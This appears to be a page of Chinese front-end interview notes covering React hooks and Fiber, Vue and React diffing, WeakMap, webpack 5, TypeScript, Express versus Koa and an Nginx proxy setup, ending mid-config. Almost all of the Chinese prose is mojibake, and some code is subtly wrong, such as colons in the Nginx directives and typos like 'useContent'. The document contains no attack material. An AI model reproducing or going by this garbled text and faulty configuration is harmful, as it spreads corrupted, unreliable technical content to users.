æ¥ç¡®ä¿ç»„ä»¶æ­£ç¡®æ›´æ–°ï¼Œå¯ä»¥è€ƒè™‘ç”¨ immutable å¯¹è±¡åŠ é€Ÿæ•°æ®æ¯”è¾ƒã€‚ React.memo ä¸ºé«˜é˜¶ç»„ä»¶ï¼Œä»…æ£€æŸ¥ props å˜æ›´ï¼Œä¸”å®žçŽ°ä¸­æ‹¥æœ‰ useStateï¼ŒuseReducer æˆ– useContent çš„ hookã€‚ React hook å‡½æ•°å¼ç»„ä»¶æ²¡æœ‰ thisï¼Œä¸èƒ½åˆ†é…å’Œè¯»å– this.stateã€‚ å¼•å…¥ useState Hookï¼Œå®ƒè®©æˆ‘ä»¬å‡½æ•°ç»„ä»¶ä¸­å­˜å‚¨å†…éƒ¨ stateã€‚ è§£æž„å‡º state ä¸­çš„å˜é‡å’Œå¯¹åº”çš„èµ‹å€¼å‡½æ•°ï¼Œä»Žå°†æ›´æ–° state å˜é‡æ€»æ˜¯æ›¿æ¢å®ƒå˜æˆåˆå¹¶å®ƒçš„å½¢å¼ã€‚ useEffect Hook çœ‹åš componentDidMountã€componentDidUpdate å’Œ componentWillUnmount è¿™ä¸‰ä¸ªå‡½æ•°çš„ç»„åˆã€‚ Hook ä¸€ä¸ªç›®çš„æ˜¯è§£å†³ class ç”Ÿå‘½å‘¨æœŸç»å¸¸åŒ…å«ä¸ç›¸å…³é€»è¾‘ï¼Œä½†åˆæŠŠç›¸å…³é€»è¾‘åˆ†ç¦»åˆ°ä¸åŒæ–¹æ³•ä¸­çš„é—®é¢˜ã€‚æ¯”å¦‚è®¢é˜…é€»è¾‘åˆ†å‰²åˆ° componentDidMount å’Œ componentWillUnmount ä¸­ã€‚ hook éœ€è¦åœ¨æˆ‘ä»¬ç»„å»ºçš„æœ€é¡¶å±‚è°ƒç”¨ï¼Œä¸èƒ½æ”¾åˆ° ifã€which ç­‰è¯­å¥é‡Œé¢ã€‚ è‡ªå®šä¹‰ Hook æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå…¶åç§°ä»¥ use å¼€å¤´ï¼Œå‡½æ•°å†…éƒ¨å¯ä»¥è°ƒç”¨å…¶ä»–çš„ Hookã€‚æ¯æ¬¡ä½¿ç”¨è‡ªå®šä¹‰ Hookï¼Œå…¶ä¸­çš„æ‰€æœ‰ state å’Œå‰¯ä½œç”¨éƒ½æ˜¯å®Œå…¨éš”ç¦»çš„ã€‚ useCallback å’Œ useMemo ClassComponent ä¸­çˆ¶ç»„ä»¶å‘å­ç»„ä»¶ä¼ çš„å€¼æ˜¯åŒ¿åå‡½æ•°ï¼Œåœ¨çˆ¶ç»„ä»¶æ›´æ–°æ—¶ï¼Œè¯¥åŒ¿åå‡½æ•°éƒ½ä¼šç”Ÿæˆæ–°å‡½æ•°ï¼Œå¯¼è‡´å­ç»„ä»¶ä¹Ÿä¼šæ›´æ–°ï¼› FunctionComponent ä¸­çˆ¶ç»„ä»¶å‘å­ç»„ä»¶ä¼ çš„å€¼æ˜¯å‡½æ•°ï¼Œåœ¨çˆ¶ç»„å»ºæ›´æ–°æ—¶ï¼Œè¯¥å‡½æ•°ä¹Ÿä¼šç”Ÿæˆæ–°å‡½æ•°ï¼Œå¯¼è‡´å­ç»„å»ºä¹Ÿä¼šæ›´æ–°ï¼› useCallback ç¬¬ä¸€ä¸ªå‚æ•°å›žè°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¾èµ–å˜é‡ã€‚è¿”å›žä¸€ä¸ª memoized å›žè°ƒå‡½æ•°ï¼Œåœ¨ä¾èµ–å‚æ•°ä¸å˜çš„æƒ…å†µä¸‹è¿”å›žå›žè°ƒå‡½æ•°æ˜¯åŒä¸€ä¸ªå¼•ç”¨åœ°å€ï¼› useMemo å°†è°ƒç”¨ fn å‡½æ•°å¹¶è¿”å›žç»“æžœï¼ŒuseCallback å°†è¿”å›ž fn å‡½æ•°è€Œä¸è°ƒç”¨å®ƒï¼› useCallback é’ˆå¯¹äºŽå­ç»„å»ºé‡å¤æ¸²æŸ“çš„ä¼˜åŒ–ï¼ŒuseMemo é’ˆå¯¹äºŽå½“å‰ç»„å»ºé«˜å¼€é”€çš„è®¡ç®—ï¼› å‚è€ƒï¼šå½»åº•ç†è§£ useCallback å’Œ useMemo setState åŒæ­¥å’Œå¼‚æ­¥ setState åªåœ¨åˆæˆäº‹ä»¶ï¼ˆonclickã€onChange ç­‰ï¼‰å’Œé’©å­å‡½æ•°ï¼ˆcomponentWillUpdateã€componentDidMount ç­‰ï¼‰ä¸­æ˜¯å¼‚æ­¥çš„ï¼Œåœ¨åŽŸç”Ÿäº‹ä»¶å’Œ setTimeout ä¸­éƒ½æ˜¯åŒæ­¥çš„ï¼› setState å¼‚æ­¥å¹¶ä¸æ˜¯è¯´å†…éƒ¨ç”±å¼‚æ­¥ä»£ç å®žçŽ°ï¼Œå…¶å®žæœ¬èº«æ‰§è¡Œè¿‡ç¨‹å’Œä»£ç éƒ½æ˜¯åŒæ­¥çš„ï¼Œåªæ˜¯åˆæˆäº‹ä»¶å’Œé’©å­å‡½æ•°çš„è°ƒç”¨é¡ºåºåœ¨æ›´æ–°ä¹‹å‰ï¼Œå¯¼è‡´åˆæˆäº‹ä»¶å’Œé’©å­å‡½æ•°ä¸­æ²¡æ³•æ‹¿åˆ°æ›´æ–°åŽçš„å€¼ï¼Œå¯ä»¥é€šè¿‡ç¬¬äºŒä¸ªå‚æ•° callback æ‹¿åˆ°æ›´æ–°åŽçš„ç»“æžœï¼› setState æ‰¹é‡æ›´æ–°ä¼˜åŒ–æ˜¯å»ºç«‹åœ¨å¼‚æ­¥ä¹‹ä¸Šï¼Œåœ¨åŽŸç”Ÿäº‹ä»¶å’Œ setTimeout ä¸­ä¸ä¼šæ‰¹é‡æ›´æ–°ã€‚åœ¨å¼‚æ­¥ä¸­å¦‚æžœå¯¹åŒä¸€ä¸ªå€¼è¿›è¡Œå¤šæ¬¡ setStateï¼Œæ‰¹é‡æ›´æ–°ç­–ç•¥ä¼šå¯¹å…¶è¿›è¡Œè¦†ç›–ï¼Œå–æœ€åŽä¸€æ¬¡çš„æ‰§è¡Œã€‚ å‚è€ƒä½ çœŸçš„ç†è§£ setState å—ï¼Ÿ Fiber åŽŸç†æµè§ˆå™¨åœ¨ä¸€å¸§å†…å¯èƒ½ä¼šåšæ‰§è¡Œä¸‹åˆ—ä»»åŠ¡ï¼Œè€Œä¸”å®ƒä»¬çš„æ‰§è¡Œé¡ºåºåŸºæœ¬æ˜¯å›ºå®šçš„ï¼š å¤„ç†ç”¨æˆ·è¾“å…¥äº‹ä»¶ï¼› JavaScript æ‰§è¡Œï¼› requestAnimationï¼› å¸ƒå±€ layoutï¼› ç»˜åˆ¶ paintï¼› å¦‚æžœæµè§ˆå™¨å¤„ç†ä¸Šè¿°çš„ä»»åŠ¡è¿˜æœ‰ç›ˆä½™æ—¶é—´ï¼Œå°±ä¼šè°ƒç”¨ requestIdleCallbackã€‚ React æ¸²æŸ“é¡µé¢åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š åè°ƒé˜¶æ®µï¼ˆreconciliationï¼‰ï¼šåœ¨è¿™ä¸ªé˜¶æ®µ React ä¼šæ›´æ–°æ•°æ®ç”Ÿæˆæ–°çš„ Virtual DOMï¼Œç„¶åŽé€šè¿‡ Diff ç®—æ³•å¿«é€Ÿæ‰¾å‡ºéœ€è¦æ›´æ–°çš„å…ƒç´ ï¼Œæ”¾åœ¨æ›´æ–°é˜Ÿåˆ—ä¸­åŽ»ï¼Œå¾—åˆ°æ–°çš„æ›´æ–°é˜Ÿåˆ—ï¼› æäº¤é˜¶æ®µï¼ˆcommitï¼‰ï¼šè¿™ä¸ªé˜¶æ®µ React ä¼šéåŽ†æ›´æ–°é˜Ÿåˆ—ï¼Œå°†æ‰€æœ‰çš„å˜æ›´ä¸€æ¬¡æ€§æ›´æ–°åˆ° DOM ä¸Šã€‚ React é¢ä¸´çš„æŒ‘æˆ˜æ˜¯æ›´æ–°æ•°æ®å¤šäº†ä¼šé€ æˆä¸å“åº”é—®é¢˜ï¼šå‡å¦‚æˆ‘ä»¬æ›´æ–°ä¸€ä¸ª stateï¼Œæœ‰ 1000 ç»„ä»¶éœ€è¦æ›´æ–°ï¼Œæ¯ä¸ªç»„ä»¶æ›´æ–°éœ€è¦ 1msï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šå°†è¿‘ 1s çš„æ—¶é—´ï¼Œä¸»çº¿ç¨‹è¢« React å ç”¨ï¼Œè¿™æ®µæ—¶é—´ç”¨æˆ·çš„æ“ä½œä¸ä¼šå¾—åˆ°ä»»ä½•çš„åé¦ˆï¼Œåªæœ‰å½“ React ä¸­éœ€è¦åŒæ­¥æ›´æ–°çš„ä»»åŠ¡å®ŒæˆåŽï¼Œä¸»çº¿ç¨‹æ‰è¢«é‡Šæ”¾ã€‚è¿™ 1s æœŸé—´æµè§ˆå™¨ä¼šå¤±åŽ»å“åº”ï¼Œç”¨æˆ·ä½“éªŒå·®ã€‚ Fiber è§£å†³æ–¹æ¡ˆã€‚Fiber ä¸­æ–‡è§£é‡Š çº¤ç¨‹ï¼Œæ˜¯çº¿ç¨‹é¢—ç²’åŒ–çš„ä¸€ä¸ªæ¦‚å¿µã€‚Fiber å¯ä»¥è®©å¤§é‡åŒæ­¥è®¡ç®—è¢«æ‹†è§£ã€å¼‚æ­¥åŒ–ï¼Œä½¿å¾—æµè§ˆå™¨ä¸»çº¿ç¨‹å¾—ä»¥è°ƒæŽ§ã€‚ Fiber çš„åè°ƒé˜¶æ®µå¯ä»¥ï¼š æš‚åœè¿è¡Œä»»åŠ¡ï¼› æ¢å¤å¹¶ç»§ç»­æ‰§è¡Œä»»åŠ¡ï¼› è·Ÿä¸åŒçš„ä»»åŠ¡åˆ†é…ä¸åŒçš„ä¼˜å…ˆçº§ï¼› è¿™æ ·æŠŠä¸€ä¸ªè€—æ—¶é•¿çš„ä»»åŠ¡åˆ†æˆå¾ˆå¤šå°ç‰‡ï¼Œæ¯ä¸€ä¸ªå°ç‰‡çš„è¿è¡Œæ—¶é—´å¾ˆçŸ­ï¼Œè™½ç„¶æ€»æ—¶é—´ä¾æ—§å¾ˆé•¿ï¼Œä½†æ˜¯åœ¨æ¯ä¸ªå°ç‰‡æ‰§è¡Œå®Œä¹‹åŽï¼Œéƒ½ç»™å…¶ä»–ä»»åŠ¡ä¸€ä¸ªæ‰§è¡Œæœºä¼šï¼Œè¿™æ ·å”¯ä¸€çš„ä¸»çº¿ç¨‹ä¸ä¼šè¢«ç‹¬å ï¼Œå…¶ä»–ä»»åŠ¡ä¾ç„¶ä¼šæœ‰è¿è¡Œæœºä¼šã€‚ å› ä¸ºåè°ƒé˜¶æ®µå¯èƒ½è¢«ä¸­æ–­ã€æ¢å¤ï¼Œç”šè‡³é‡åšï¼ŒReact åè°ƒé˜¶æ®µçš„ç”Ÿå‘½å‘¨æœŸé’©å­å¯èƒ½ä¼šè¢«è°ƒç”¨å¤šæ¬¡ï¼Œäº§ç”Ÿå‰¯ä½œç”¨ã€‚æ¯”å¦‚ componentWillMountã€componentWillReceiveProps å’Œ componentWillUpdate å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ã€‚ Fiber å®žçŽ°åŽŸç† React Fiber çš„åšæ³•æ˜¯ä¸ä½¿ç”¨ javascript çš„æ ˆï¼Œé€šè¿‡é“¾è¡¨çš„æ•°æ®ç»“æž„ï¼Œæ¨¡æ‹Ÿå‡½æ•°è°ƒç”¨æ ˆï¼Œå°†éœ€è¦é€’å½’å¤„ç†çš„äº‹æƒ…åˆ†è§£æˆå¢žé‡çš„æ‰§è¡Œå•å…ƒï¼Œå°†é€’å½’è½¬æ¢ä¸ºè¿­ä»£ã€‚ å°†ä¸€ä¸ª state æ›´æ–°éœ€è¦æ‰§è¡Œçš„åŒæ­¥ä»»åŠ¡æ‹†åˆ†æˆä¸€ä¸ª Fiber ä»»åŠ¡é˜Ÿåˆ—ï¼› åœ¨ä»»åŠ¡é˜Ÿåˆ—ä¸­é€‰å‡ºä¼˜å…ˆçº§é«˜çš„ä»»åŠ¡æ‰§è¡Œï¼Œå¦‚æžœæ‰§è¡Œæ—¶é—´è¶…è¿‡ deathLineï¼Œåˆ™è®¾ç½®ä¸º pending çŠ¶æ€æŒ‚èµ·çŠ¶æ€ï¼› ä¸€ä¸ª Fiber æ‰§è¡Œç»“æŸæˆ–è€…æŒ‚èµ·ï¼Œä¼šè°ƒç”¨åŸºäºŽ requestIdleCallback/requestAnimation å®žçŽ°è°ƒåº¦å™¨ï¼Œè¿”å›žä¸€ä¸ªæ–°çš„ Fiber ä»»åŠ¡é˜Ÿåˆ—ç»§ç»­è¿›è¡Œä¸Šè¿°è¿‡ç¨‹ã€‚ é¦–å…ˆï¼Œåœ¨è¯´ React Fiber æž¶æž„å‰ï¼Œè¯´ä¸€ä¸‹å®ƒäº§ç”Ÿçš„èƒŒæ™¯å§ï¼Œåœ¨ React16 ä¹‹å‰ï¼Œæ•°æ®æ›´æ–°ï¼Œæ˜¯é€šè¿‡å‡½æ•°è°ƒç”¨æ ˆæ–¹å¼ï¼Œè¯¥è¿‡ç¨‹æ˜¯åŒæ­¥çš„ï¼Œä¼šå æ® js ä¸»çº¿ç¨‹ï¼Œæ¯”å¦‚ä¸€ä¸ªç»„ä»¶æ›´æ–°éœ€è¦ 1 æ¯«ç§’ï¼Œ1000 ä¸ªç»„å»ºå°±éœ€è¦ 1sï¼Œåœ¨è¿™æ®µæ—¶é—´å†…ï¼Œæµè§ˆå™¨çš„å…¶ä»–ä»»åŠ¡ä¸èƒ½å¾—åˆ°å“åº”ï¼Œæ¯”å¦‚ç”¨æˆ·çš„ IO æ“ä½œï¼Œè¿™æ ·å°±ä¼šå‡ºçŽ°å¡é¡¿çŽ°è±¡ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚Fiber æž¶æž„çš„æ€æƒ³æ˜¯ï¼Œå°†å¤§é‡åŒæ­¥ä»»åŠ¡è¿›è¡Œæ‹†è§£ï¼Œå’Œå¼‚æ­¥åŒ–ã€‚åœ¨ React Fiber å®žçŽ°æ˜¯å°†åŽŸæ¥çš„å‡½æ•°è°ƒç”¨æ ˆçš„æ•°æ®ç»“æž„ï¼Œå˜æˆé“¾è¡¨ç»“æž„ï¼Œé“¾è¡¨çš„æ¯ä¸€é¡¹æ˜¯ä»»åŠ¡æ‰§è¡Œå•å…ƒï¼Œä»Žè€Œå¯ä»¥å®žçŽ°å¯¹ä»»åŠ¡çš„æš‚åœå’Œé‡å¯ã€‚React å°†ä¸€ä¸ª state æ›´æ–°éœ€è¦æ‰§è¡Œçš„åŒæ­¥ä»»åŠ¡æ‹†åˆ†æˆä¸€ä¸ª Fiber ä»»åŠ¡é˜Ÿåˆ—ã€‚ä»Ž Fiber ä»»åŠ¡é˜Ÿåˆ—ä¸­é€‰å‡ºä¼˜å…ˆçº§é«˜çš„ä»»åŠ¡æ‰§è¡Œï¼Œå¦‚æžœæ‰§è¡Œæ—¶é—´è¶…è¿‡ deathLineï¼Œè®¾ç½®ä¸º padding æŒ‚èµ·çŠ¶æ€ï¼Œä¼šåœ¨æµè§ˆå™¨ä¸‹æ¬¡ç©ºé—²æ—¶é—´ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿå°±åœ¨ requestIdleCallback API å®žçŽ°è°ƒåº¦ã€‚ å‚è€ƒï¼šæµ…è°ˆ React 16 ä¸­çš„ Fiber æœºåˆ¶è¿™å¯èƒ½æ˜¯æœ€é€šä¿—çš„ React Fiber(æ—¶é—´åˆ†ç‰‡) æ‰“å¼€æ–¹å¼ React æ€§èƒ½ä¼˜åŒ– ä½¿ç”¨ React.PuerComponent å’Œ React.memo æ¥ç¼“å­˜ç»„å»º ä½¿ç”¨ useMemo ç¼“å­˜å¤§é‡çš„è®¡ç®— ä½¿ç”¨ React.Lazy é…åˆ Suspense å»¶æ—¶åŠ è½½ç»„ä»¶ é¿å…ä½¿ç”¨å†…è”å¯¹è±¡å’ŒåŒ¿åå‡½æ•° ä½¿ç”¨ React.Fragment é¿å…æ·»åŠ é¢å¤–çš„ DOM å‚è€ƒï¼šReact æ€§èƒ½ä¼˜åŒ– Vue æ€§èƒ½ä¼˜åŒ– v-for ä¸è¦å’Œ v-if ä¸€èµ·ä½¿ç”¨ v-show åº”ç”¨åœ¨æ˜¾ç¤ºå’Œéšè—é¢‘ç¹æ“ä½œä¸Š v-for key å°½é‡ä¸è¦ç”¨ index å‡½æ•°å¼ç»„ä»¶ è™šæ‹Ÿæ»šåŠ¨ virtual-list Vue3 å’Œ React çš„ hook åŒºåˆ« Vue hook åªä¼šåœ¨ setup å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ï¼Œreact æ•°æ®æ›´æ”¹æ—¶å€™ä¼šå¯¼è‡´é‡æ–° renderï¼Œhooks é‡æ–°æ³¨å†Œï¼Œè™½ç„¶ React æœ‰ç›¸åº”æ–¹æ¡ˆï¼Œæ¯”å¦‚ userCallbackï¼ŒuserMemo ç­‰ï¼› ä¸å—è°ƒç”¨é¡ºåºçš„é™åˆ¶ï¼Œå¯ä»¥æœ‰æ¡ä»¶çš„è¢«è°ƒç”¨ï¼› ä¸ä¼šåœ¨åŽç»­æ›´æ–°æ—¶äº§ç”Ÿå¤§é‡çš„å†…è”å‡½æ•°è€Œå½±å“å¼•æ“Žä¼˜åŒ–æˆ–è€…å¯¼è‡´ GC åŽ‹åŠ›ï¼› ä¸éœ€è¦æ€»æ˜¯ä½¿ç”¨ useCallback æ¥ç¼“å­˜ä¼ ç»™å­ç»„ä»¶çš„å›žè°ƒå‡½æ•°é˜²æ­¢è¿‡åº¦æ›´æ–°ï¼› ä¸éœ€è¦æ‹…å¿ƒä¼ å…¥é”™è¯¯çš„ä¾èµ–æ•°ç»„ç»™ useEffect/useMemo/useCallback ä»Žè€Œå¯¼è‡´å›žè°ƒä¸­ä½¿ç”¨äº†è¿‡æœŸçš„å€¼ï¼ŒVue çš„ä¾èµ–è¿½è¸ªæ˜¯å…¨è‡ªåŠ¨çš„ï¼› å‚è€ƒä¸€æ–‡çœ‹æ‡‚ï¼šVue3 å’Œ React Hook å¯¹æ¯”ï¼Œåˆ°åº•å“ªé‡Œå¥½ï¼Ÿ Vue ä¸Ž React diff ç®—æ³•å·®å¼‚ Vue åˆ—è¡¨æ¯”å¯¹ï¼Œé‡‡ç”¨åŒå‘æŒ‡é’ˆå‘å†…æ”¶ç¼©ç®—æ³•ï¼Œè€Œ React åˆ™é‡‡ç”¨ä»Žå·¦åˆ°å³ä¾æ¬¡æ¯”å¯¹æ–¹å¼ï¼Œé€šè¿‡æ¯”è¾ƒ lastIndex å’Œä¸Šæ¬¡_mounteIndexï¼ŒlastIndex &gt; _moutedIndex èŠ‚ç‚¹ä¸åŠ¨ã€‚å½“ä¸€ä¸ªé›†åˆï¼ŒåªæŠŠæœ€åŽä¸€ä¸ªå…ƒç´ ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªï¼ŒReact ä¼šæŠŠå‰é¢çš„èŠ‚ç‚¹ä¾æ¬¡ç§»åŠ¨ï¼Œè€Œ Vue åªä¼šæŠŠæœ€åŽä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªã€‚æ€»ä½“ä¸Šï¼ŒVue æ¯”å¯¹æ–¹å¼æ›´é«˜æ•ˆï¼› åˆ¤æ–­æ˜¯å¦æ˜¯ç›¸åŒèŠ‚ç‚¹ï¼ŒVue ä¼šæ¯”å¯¹ tagã€keyï¼Œæ˜¯å¦æ˜¯æ³¨é‡ŠèŠ‚ç‚¹ï¼Œæ˜¯å¦æœ‰ dataï¼Œæ˜¯å¦æ˜¯ input ç›¸åŒçš„ typeï¼Œè€Œ React æ¯”è¾ƒç®€å•ï¼Œåªåˆ¤æ–­ tag å’Œ keyï¼› Vue åŸºäºŽ snabbdom åº“ï¼Œå®ƒæœ‰è¾ƒå¥½çš„é€Ÿåº¦å’Œæ¨¡å—æœºåˆ¶ï¼ŒVue diff ä½¿ç”¨åŒå‘é“¾è¡¨è¾¹æ¯”å¯¹è¾¹æ›´æ–° DOMï¼Œè€Œ React ä¸»è¦æ˜¯ä½¿ç”¨ diff é˜Ÿåˆ—ä¿å­˜éœ€è¦æ›´æ–°å“ªäº› DOMï¼Œå¾—åˆ° patch æ ‘ï¼Œå†ç»Ÿä¸€æ‰¹é‡æ›´æ–° DOMã€‚ å‚è€ƒReact å’Œ Vue çš„ diff ç®—æ³• ä¸å¯æ€è®®çš„ React diff Vue2 ä¸Ž Vue3 diff å·®å¼‚ Vue3 äº‹ä»¶ç¼“å­˜ã€é™æ€æ ‡è®°ã€é™æ€æå‡ Vue3 patchKeyedChildren æ¯”å¯¹ï¼Œä¼šåŸºäºŽå¤´å’Œå°¾æ¯”è¾ƒï¼Œå°¾å’Œå°¾æ¯”è¾ƒï¼ŒåŸºäºŽæœ€é•¿é€’å¢žå­åºåˆ—è¿›è¡Œç§»åŠ¨ã€æ·»åŠ å’Œåˆ é™¤ã€‚ å‚è€ƒæ·±å…¥æµ…å‡ºè™šæ‹Ÿ DOM å’Œ Diff ç®—æ³•ï¼ŒåŠ Vue2 ä¸Ž Vue3 ä¸­çš„åŒºåˆ« Set ä¸Ž WeakSetï¼ŒMap ä¸Ž WeakMap çš„åŒºåˆ« Set å’Œ WeakSet ä¸­çš„æ•°æ®ä¼šåŽ»é‡ï¼ŒSet çš„æ¯ä¸€é¡¹å¯ä»¥æ˜¯ä»»æ„ç±»åž‹ï¼Œä½†æ˜¯ WeakSet çš„æ¯ä¸€é¡¹åªèƒ½æ˜¯å¯¹è±¡ç±»åž‹ã€‚WeakSet æž„é€ å‡½æ•°å‚æ•°æ•°ç»„æ¯ä¸€é¡¹éƒ½ä¼šç”Ÿæˆ WeakSet æˆå‘˜ï¼ŒWeakSet ä¸­çš„å¯¹è±¡æ˜¯å¼±å¼•ç”¨ï¼Œå³åžƒåœ¾å›žæ”¶æœºåˆ¶ä¸è€ƒè™‘ WeakSet å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœå…¶ä»–å¯¹è±¡éƒ½ä¸å†å¼•ç”¨è¯¥å¯¹è±¡ï¼Œé‚£ä¹ˆåžƒåœ¾å›žæ”¶æœºåˆ¶ä¼šè‡ªåŠ¨å›žæ”¶è¯¥å¯¹è±¡çš„å†…å­˜ï¼Œä¸è€ƒè™‘è¯¥å¯¹è±¡è¿˜å­˜ä¸å­˜åœ¨ WeakSet ä¸­ï¼Œå› æ­¤ï¼ŒWeakSet ä¸å¯è¢«éåŽ†ã€‚ Map çš„é”®åå¯ä»¥æ˜¯ä»»æ„ç±»åž‹ï¼ŒWeakMap åªæŽ¥å—å¯¹è±¡ä½œä¸ºé”®åï¼ˆnull é™¤å¤–ï¼‰ã€‚WeakMap çš„é”®åæ‰€å¼•ç”¨çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åžƒåœ¾å›žæ”¶æœºåˆ¶ä¸å°†è¯¥å¼•ç”¨è€ƒè™‘åœ¨å†…ï¼Œåªè¦æ‰€å¼•ç”¨çš„å¯¹è±¡çš„å…¶ä»–å¼•ç”¨éƒ½è¢«æ¸…é™¤ï¼Œåžƒåœ¾å›žæ”¶æœºåˆ¶å°±ä¼šè¢«é‡Šæ”¾è¯¥å¯¹è±¡æ‰€å ç”¨çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä¸éœ€è¦ï¼ŒWeakMap é‡Œé¢çš„é”®åå¯¹è±¡å’Œæ‰€å¯¹åº”çš„é”®å€¼å¯¹ä¼šè‡ªåŠ¨æ¶ˆå¤±ã€‚ webpack5 åšäº†å“ªäº›æ”¹è¿›ï¼Ÿ ä¼˜åŒ–äº†æŒä¹…åŒ–ç¼“å­˜å’Œç¼“å­˜ç®—æ³•ã€‚é…ç½® cache: {type: &#39;filesystem&#39;} æ¥ç¼“å­˜ç”Ÿæˆçš„ webpack æ¨¡å—å’Œ chunkï¼Œæ”¹å–„æž„å»ºé€Ÿåº¦ã€‚è¿™æ ·å°±æ— é¡» dll pulgin å’Œ cache loaderã€‚å½“ä½¿ç”¨[contenthash]æ—¶ï¼Œwebpack5 å°†ä½¿ç”¨çœŸæ­£çš„æ–‡ä»¶å†…å®¹å“ˆå¸Œå€¼ï¼Œä¹‹å‰å®ƒåªä½¿ç”¨å†…éƒ¨ç»“æž„çš„å“ˆå¸Œå€¼ã€‚ webpack5 é»˜è®¤ä½¿ç”¨ terser-webpack-plugin è¿›è¡Œå¤šçº¿ç¨‹åŽ‹ç¼©å’Œç¼“å­˜ï¼Œæ— é¡»å†å¼•å…¥ parallel-uglify-pluginã€‚ æ–°å¢žâ€œæ¨¡å—è”é‚¦â€åŠŸèƒ½ï¼Œå…è®¸å¤šä¸ª webpack æž„å»ºä¸€èµ·å·¥ä½œï¼Œæ¨¡å—å¯ä»¥ä»ŽæŒ‡å®šçš„è¿œç¨‹æž„å»ºä¸­å¯¼å…¥ï¼Œå¹¶ä»¥æœ€å°çš„é™åˆ¶ä½¿ç”¨ã€‚ åµŒå¥—ã€å†…éƒ¨æ¨¡å—å’Œ CommonJS çš„ tree-shakingã€‚ è·Ÿè¸ªå¯¹å¯¼å‡ºçš„åµŒå¥—å±žæ€§çš„è®¿é—®ã€‚è¿™å¯ä»¥æ”¹å–„é‡æ–°å¯¼å‡ºå‘½åç©ºé—´å¯¹è±¡æ—¶çš„ tree-shakingï¼ˆæ¸…é™¤æœªä½¿ç”¨çš„å¯¼å‡ºå’Œæ··æ·†å¯¼å‡ºï¼‰ã€‚å¯¹æ¨¡å—ä¸­çš„æ ‡è®°è¿›è¡Œåˆ†æžï¼Œæ‰¾å‡ºå¯¼å‡ºå’Œå¼•ç”¨çš„ä¾èµ–å…³ç³»ã€‚ å…è®¸å¯åŠ¨å•ä¸ªæ–‡ä»¶çš„ç›®æ ‡çŽ°åœ¨æ”¯æŒè¿è¡Œæ—¶è‡ªåŠ¨åŠ è½½å¼•å¯¼æ‰€éœ€çš„ä¾èµ–ä»£ç ç‰‡æ®µã€‚ å‚è€ƒï¼šé˜”åˆ«ä¸¤å¹´ï¼Œwebpack5 æ­£å¼å‘å¸ƒ typescript ä¸­ type å’Œ interface åŒºåˆ«ï¼Ÿ type å¯ä»¥å®šä¹‰åŸºæœ¬ç±»åž‹åˆ«å type userName = stringï¼› type å¯ä»¥å£°æ˜Žè”åˆç±»åž‹ type Student = {stuNo: number} | {classId: number}ï¼› type å¯ä»¥å£°æ˜Žå…ƒç¥–ç±»åž‹ type Arr = [number, string]ï¼› interface å¯ä»¥åˆå¹¶å£°æ˜Žï¼Œtype ä¸è¡Œï¼› 12345678910interface Person &#123; name: string;&#125;interface Person &#123; age: number;&#125;const user: Person = &#123; name: 'wuwhs', age: 20&#125; Express ä¸Ž Koa çš„åŒºåˆ«ç›¸åŒç‚¹ï¼š å¯¹ http æ¨¡å—è¿›è¡Œå°è£… ä¸åŒç‚¹ï¼š express å†…ç½®äº†å¾ˆå¤šä¸­é—´ä»¶å¯ä¾›ä½¿ç”¨ï¼Œè€Œ koa æ²¡æœ‰ï¼› express åŒ…å«è·¯ç”±ï¼Œè§†å›¾æ¸²æŸ“ç­‰ç‰¹æ€§ï¼Œè€Œ koa åªæœ‰ http æ¨¡å—ï¼› express ä¸­é—´ä»¶æ¨¡åž‹ä¸ºçº¿æ€§ï¼Œè€Œ koa çš„ä¸­é—´ä»¶æ¨¡åž‹ä¸º U åž‹ï¼Œä¹Ÿå¯ç§°ä¸ºæ´‹è‘±æ¨¡åž‹æž„é€ ä¸­é—´ä»¶ï¼› express é€šè¿‡å›žè°ƒå‡½æ•°å¤„ç†å¼‚æ­¥æ“ä½œï¼Œkoa ä¸»è¦æ˜¯åŸºäºŽ co ä¸­é—´ä»¶ï¼Œé€šè¿‡ generator ä½¿ç”¨åŒæ­¥æ–¹å¼å†™å¼‚æ­¥é€»è¾‘ï¼› Nginx æ­£å‘å’Œåå‘ä»£ç† å®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶ä¸”æŒ‡å®šç›®æ ‡æœåŠ¡å™¨ï¼Œä¹‹åŽä»£ç†æœåŠ¡å™¨å‘ç›®æ ‡æœåŠ¡å™¨è½¬å‘è¯·æ±‚ï¼Œå°†èŽ·å¾—çš„å†…å®¹è¿”å›žç»™å®¢æˆ·ç«¯ã€‚ç”¨é€”ï¼šç¿»å¢™ï¼Œæ•°æ®ç¼“å­˜ï¼Œéšè—å®¢æˆ·ç«¯çœŸå®ž IPï¼› ä»£ç†æœåŠ¡å™¨æŽ¥å—å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨ï¼Œå†å°†æœåŠ¡å™¨å¤„ç†ç»“æžœè¿”å›žç»™å®¢æˆ·ç«¯ã€‚ç”¨é€”ï¼šéšè—æœåŠ¡å™¨çœŸå®ž IPï¼Œè´Ÿè½½å‡è¡¡ï¼Œæ•°æ®ç¼“å­˜ï¼Œæ•°æ®åŠ å¯†ï¼› Nginx è®¾ç½®æ­£å‘ä»£ç† 1234567server &#123; listen: 82; resolver: 8.8.8.8; # è®¾ç½®DNSçš„IPï¼Œç”¨æ¥è§£æž proxy_pass ä¸­çš„åŸŸå location / &#123; proxy_pass 